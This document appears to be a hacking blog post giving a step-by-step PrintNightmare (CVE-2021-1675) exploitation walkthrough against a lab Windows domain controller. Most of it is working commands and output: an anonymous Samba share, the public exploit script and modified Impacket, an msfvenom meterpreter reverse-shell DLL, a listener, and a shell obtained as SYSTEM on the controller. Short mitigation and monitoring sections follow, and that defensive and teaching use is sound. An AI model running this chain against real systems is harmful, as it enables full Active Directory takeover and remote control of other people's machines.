---
title: "PrintNightmare / CVE-2021-1675 - Step-by-step Guide"
header:
  teaser: /assets/images/2021-07-01-10-54-23.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - Hacking
tags:
  - Kali
  - CVE-2021-1675
  - PrintNightmare
  - cube0x0
---

![printnightmare](/assets/images/2021-07-01-10-54-23.png)

## Vulnerability Info

Thanks to Trusec for the great info they've gathered [here](https://blog.truesec.com/2021/06/30/exploitable-critical-rce-vulnerability-allows-regular-users-to-fully-compromise-active-directory-printnightmare-cve-2021-1675/), from that:

PrintNightmare (CVE-2021-1675) is a vulnerability that allows an attacker with a regular user account to take over a server running the Windows Print Spooler service. This is by default running on all Windows servers and clients, including domain controllers, in an Active Directory environment.

In practice, this means that an attacker with a regular domain account can take over the entire Active Directory in a simple step. For example, if a user is compromised with a phishing attack, a threat actor can use the compromised computer to easily take over Active Directory in a matter of seconds (this can also be fully automated).

Yep. It's that bad.

## Check target is vulnerable

First check target has printer spooler running:

```text
┌──(root💀kali)-[~/cve]
└─# rpcdump.py @192.168.0.50 | grep MS-RPRN
Protocol: [MS-RPRN]: Print System Remote Protocol 
```

It is, let's go!

## Set up anonymous share

First check SAMBA is not running:

```text
┌──(root💀kali)-[~]
└─# systemctl status smbd nmbd
● smbd.service - Samba SMB Daemon
     Loaded: loaded (/lib/systemd/system/smbd.service; disabled; vendor preset: disabled)
     Active: inactive (dead)
       Docs: man:smbd(8)
             man:samba(7)
             man:smb.conf(5)

● nmbd.service - Samba NMB Daemon
     Loaded: loaded (/lib/systemd/system/nmbd.service; disabled; vendor preset: disabled)
     Active: inactive (dead)
       Docs: man:nmbd(8)
             man:samba(7)
             man:smb.conf(5)
```

Move conf file to safety

```text
┌──(root💀kali)-[~]
└─# mv /etc/samba/smb.conf /etc/samba/smb.conf.bak
```

Create new samba conf file:

```text
┌──(root💀kali)-[~/cve]
└─# cat /etc/samba/smb.conf
[global]
    map to guest = Bad User
    server role = standalone server
    usershare allow guests = yes
    idmap config * : backend = tdb
    smb ports = 445

[smb]
    comment = Samba
    path = /tmp
    guest ok = yes
    read only = no
    browsable = yes
    force user = smbuser
    force group = smbgroup
    public = yes
```

Create user and group for share:

```text
┌──(root💀kali)-[~]
└─# groupadd --system smbgroup

┌──(root💀kali)-[~]
└─# useradd --system --no-create-home --group smbgroup -s /bin/false smbuser
```

Start samba service:

```text
┌──(root💀kali)-[~]
└─# systemctl start smbd nmbd

┌──(root💀kali)-[~]
└─# systemctl status smbd nmbd
● smbd.service - Samba SMB Daemon
     Loaded: loaded (/lib/systemd/system/smbd.service; disabled; vendor preset: disabled)
     Active: active (running) since Thu 2021-07-01 10:17:28 BST; 1s ago
       Docs: man:smbd(8)
             man:samba(7)
             man:smb.conf(5)
    Process: 1312 ExecStartPre=/usr/share/samba/update-apparmor-samba-profile (code=exited, status=0/SUCCESS)
   Main PID: 1322 (smbd)
     Status: "smbd: ready to serve connections..."
      Tasks: 4 (limit: 2296)
     Memory: 6.6M
        CPU: 89ms
     CGroup: /system.slice/smbd.service
             ├─1322 /usr/sbin/smbd --foreground --no-process-group
             ├─1324 /usr/sbin/smbd --foreground --no-process-group
             ├─1325 /usr/sbin/smbd --foreground --no-process-group
             └─1327 /usr/sbin/smbd --foreground --no-process-group

Jul 01 10:17:28 kali systemd[1]: Starting Samba SMB Daemon...
Jul 01 10:17:28 kali smbd[1322]: [2021/07/01 10:17:28.117512,  0] ../../lib/util/become_daemon.c:135(daemon_ready)
Jul 01 10:17:28 kali smbd[1322]:   daemon_ready: daemon 'smbd' finished starting up and ready to serve connections
Jul 01 10:17:28 kali systemd[1]: Started Samba SMB Daemon.

● nmbd.service - Samba NMB Daemon
     Loaded: loaded (/lib/systemd/system/nmbd.service; disabled; vendor preset: disabled)
     Active: active (running) since Thu 2021-07-01 10:17:28 BST; 2s ago
       Docs: man:nmbd(8)
             man:samba(7)
             man:smb.conf(5)
   Main PID: 1315 (nmbd)
     Status: "nmbd: ready to serve connections..."
      Tasks: 1 (limit: 2296)
     Memory: 2.7M
        CPU: 26ms
     CGroup: /system.slice/nmbd.service
             └─1315 /usr/sbin/nmbd --foreground --no-process-group

Jul 01 10:17:28 kali systemd[1]: Starting Samba NMB Daemon...
Jul 01 10:17:28 kali systemd[1]: Started Samba NMB Daemon.
Jul 01 10:17:28 kali nmbd[1315]: [2021/07/01 10:17:28.053450,  0] ../../lib/util/become_daemon.c:135(daemon_ready)
Jul 01 10:17:28 kali nmbd[1315]:   daemon_ready: daemon 'nmbd' finished starting up and ready to serve connections
```

Check it's accessible

```text
┌──(root💀kali)-[~/cve]
└─# smbmap -H 192.168.0.3
[+] IP: 192.168.0.3:445 Name: 192.168.0.3
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        smb                                                     READ, WRITE     Samba
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.13.5-Debian)
```

## Get modified Impacket & Exploit

Remove Impacket if already installed:

```text
┌──(root💀kali)-[~]
└─# mkdir cve

┌──(root💀kali)-[~]
└─# cd cve

┌──(root💀kali)-[~/cve]
└─# pip3 uninstall impacket
Found existing installation: impacket 0.9.22
Not uninstalling impacket at /usr/lib/python3/dist-packages, outside environment /usr
Can't uninstall 'impacket'. No files were found to uninstall.
```

Grab cube0x0 version and install:

```text
┌──(root💀kali)-[~/cve]
└─# git clone https://github.com/cube0x0/impacket
Cloning into 'impacket'...
remote: Enumerating objects: 19553, done.
remote: Counting objects: 100% (628/628), done.
remote: Compressing objects: 100% (292/292), done.
remote: Total 19553 (delta 375), reused 524 (delta 334), pack-reused 18925
Receiving objects: 100% (19553/19553), 6.80 MiB | 2.32 MiB/s, done.
Resolving deltas: 100% (14787/14787), done.

┌──(root💀kali)-[~/cve]
└─# cd impacket

┌──(root💀kali)-[~/cve/impacket]
└─# python3 ./setup.py install
running install
running bdist_egg
running egg_info
creating impacket.egg-info
writing impacket.egg-info/PKG-INFO
writing dependency_links to impacket.egg-info/dependency_links.txt
writing requirements to impacket.egg-info/requires.txt
writing top-level names to impacket.egg-info/top_level.txt
writing manifest file 'impacket.egg-info/SOURCES.txt'
reading manifest file 'impacket.egg-info/SOURCES.txt'
reading manifest template 'MANIFEST.in'
warning: no files found matching 'tests' under directory 'examples'
warning: no files found matching '*.txt' under directory 'examples'
writing manifest file 'impacket.egg-info/SOURCES.txt'
installing library code to build/bdist.linux-x86_64/egg
running install_lib
running build_py
creating build
creating build/lib
creating build/lib/impacket
copying impacket/smb.py -> build/lib/impacket
copying impacket/eap.py -> build/lib/impacket
copying impacket/spnego.py -> build/lib/impacket
copying impacket/helper.py -> build/lib/impacket
copying impacket/IP6_Address.py -> build/lib/impacket
copying impacket/ImpactPacket.py -> build/lib/impacket
copying impacket/dot11.py -> build/lib/impacket
copying impacket/__init__.py -> build/lib/impacket
<SNIP>
```

Get the exploit:

```text
┌──(root💀kali)-[~/cve/impacket]
└─# cd ..      

┌──(root💀kali)-[~/cve]
└─# wget https://raw.githubusercontent.com/cube0x0/CVE-2021-1675/main/CVE-2021-1675.py
--2021-07-01 10:21:06--  https://raw.githubusercontent.com/cube0x0/CVE-2021-1675/main/CVE-2021-1675.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.110.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7140 (7.0K) [text/plain]
Saving to: ‘CVE-2021-1675.py’

CVE-2021-1675.py              100%[==============================================>]   6.97K  --.-KB/s    in 0s      

2021-07-01 10:21:06 (114 MB/s) - ‘CVE-2021-1675.py’ saved [7140/7140]
```

Create meterpreter payload:

```text
┌──(root💀kali)-[~/cve]
└─# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=443 -f dll > /tmp/pencer.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 8704 bytes
```

Start msfconsole:

```text
┌──(root💀kali)-[~/cve]
└─# msfconsole

                                              `:oDFo:`
                                           ./ymM0dayMmy/.
                                        -+dHJ5aGFyZGVyIQ==+-
                                    `:sm⏣~~Destroy.No.Data~~s:`
                                 -+h2~~Maintain.No.Persistence~~h+-
                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`
                          ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.
                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-
                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-
                      :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:
                      :we're.all.alike'`                     The.PFYroy.No.D7:
                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:
                      :msf>exploit -j.                       :Ns.BOB&ALICEes7:
                      :---srwxrwx:-.`                        `MS146.52.No.Per:
                      :<script>.Ac816/                        sENbove3101.404:
                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:
                      :09.14.2011.raid                       /STFU|wall.No.Pr:
                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:
                      :#OUTHOUSE-  -s:                       /corykennedyData:
                      :$nmap -oS                              SSo.6178306Ence:
                      :Awsm.da:                            /shMTl#beats3o.No.:
                      :Ring0:                             `dDestRoyREXKC3ta/M:
                      :23d:                               sSETEC.ASTRONOMYist:
                       /-                        /yo-    .ence.N:(){ :|: & };:
                                                 `:Shall.We.Play.A.Game?tron/
                                                 ```-ooy.if1ghtf0r+ehUser5`
                                               ..th3.H1V3.U2VjRFNN.jMh+.`
                                              `MjM~~WE.ARE.se~~MMjMs
                                               +~KANSAS.CITY's~-`
                                                J~HAKCERS~./.`
                                                .esc:wq!:`
                                                 +++ATH`
                                                  `

       =[ metasploit v6.0.49-dev                          ]
+ -- --=[ 2142 exploits - 1141 auxiliary - 365 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: View missing module options with show missing
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.0.3
LHOST => 192.168.0.3
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.0.3:443
```

Switch to another console and run exploit:

```text
┌──(root💀kali)-[/home/kali]
└─# cd /root/cve                                       

┌──(root💀kali)-[~/cve]
└─# ./CVE-2021-1675.py SPEN/pparker:Password1@192.168.0.50 '\\192.168.0.3\smb\pencer.dll'
[*] Try 1...
[*] Connecting to ncacn_np:192.168.0.50[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL
[*] Executing \\192.168.0.3\smb\pencer.dll
[*] Stage0: 0
```

Switch back to meterpreter:

```text
[*] Started reverse TCP handler on 192.168.0.3:443 
[*] Sending stage (200262 bytes) to 192.168.0.50
[*] Meterpreter session 1 opened (192.168.0.3:443 -> 192.168.0.50:57716) at 2021-07-01 11:16:24 +0100
```

Session connected, let's drop to a shell:

```text
meterpreter > shell
Process 6628 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>hostname
hostname
SPEN-DC1

C:\Windows\system32>whoami
whoami
nt authority\system
```

Pwned.

## Mitigation

The Print Spooler service is automatically started on Windows 10 as well as servers. For client devices you can use the Windows Firewall to block file and print sharing. This only effects the device if it's used to share out to other devices, it won't stop it's ability to print.

For servers Microsoft recommends [here](https://docs.microsoft.com/en-us/windows-server/security/windows-services/security-guidelines-for-disabling-system-services-in-windows-server#print-spooler) about disabling Print Spooler if device is not a print server.

Thanks to [Trusec](https://twitter.com/Truesec) for [this](https://blog.truesec.com/2021/06/30/fix-for-printnightmare-cve-2021-1675-exploit-to-keep-your-print-servers-running-while-a-patch-is-not-available/) post. Which gives us a way to tighten security on the drivers folder without the need to disable print services:

```text
$Path = "C:\Windows\System32\spool\drivers"
$Acl = Get-Acl $Path
$Ar = New-Object  System.Security.AccessControl.FileSystemAccessRule("System", "Modify", "ContainerInherit, ObjectInherit", "None", "Deny")
$Acl.AddAccessRule($Ar)
Set-Acl $Path $Acl
```

## Monitoring

You need the Operational logs enabled to gather information from them. Thanks to [Kaidja](https://twitter.com/kaidja) for this:

```test
$AllLogs = Get-WinEvent -ListLog *
$PrinterLogs = $AllLogs | where LogName -eq "Microsoft-Windows-PrintService/Operational"
$PrinterLogs.IsEnabled = $True
$PrinterLogs.SaveChanges()
```

Lots of info from LaresLabs [here](https://github.com/LaresLLC/CVE-2021-1675) - includes GPO, PowerShell, Sysmon, Spluk, etc

Sentinel KQL [here](https://github.com/rod-trent/SentinelKQL/blob/master/PrintNightmare.txt) to hunt for compromised devices.

Sigma Rules [here](https://github.com/SigmaHQ/sigma/pull/1592)
